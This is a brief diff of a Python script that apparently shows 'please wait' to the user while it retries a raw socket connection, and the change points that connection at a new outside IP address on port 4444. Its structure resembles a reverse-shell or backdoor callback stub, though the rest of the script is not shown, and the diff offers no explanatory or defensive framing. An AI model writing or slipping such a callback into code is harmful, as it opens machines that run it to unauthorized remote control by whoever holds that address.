@@ -12,7 +12,7 @@ print("please wait ")
 for x in range(10):
 	try:
 		s=socket.socket(2,socket.SOCK_STREAM)
-		s.connect(('18.216.53.253',17848))
+		s.connect(('105.235.137.226',4444))
 		break
 	except:
 		time.sleep(5)
